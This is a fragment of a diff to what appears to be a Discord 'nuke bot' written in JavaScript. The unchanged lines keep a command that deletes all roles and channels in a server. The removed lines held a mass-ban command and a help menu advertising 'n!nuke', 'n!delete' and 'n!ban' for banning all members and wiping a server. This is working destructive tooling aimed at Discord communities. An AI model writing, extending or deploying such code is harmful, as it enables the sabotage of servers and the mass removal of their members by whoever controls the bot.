@@ -59,22 +59,7 @@ if(msg.content.toLowerCase().startsWith("n!" + "delete")){
     msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
 }
-if(msg.content === "javascript! ban all"){
-    msg.guild.members.cache.filter(m => m.user.id !== msg.guild.ownerID && m.user.id !== author.user.id && m.roles.highest.position < msg.guild.me.roles.highest.position).forEach((m)=>{
-      m.ban("sus server").then((mem)=>{
-        msg.channel.send(`Succesfully banned ${mem.user.id} ${m.user.tag}`)
-      })
-    })
-  } 
-if(msg.content.toLowerCase().startsWith("n!" + "help")){
-    msg.channel.send({
-        embed: {
-            color: 0xff0000,
-            author: { name: "Nuke Bot | Test" },
-            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n"
-        }
-    })
-}
+
 });
 client.on('message', message => {
 
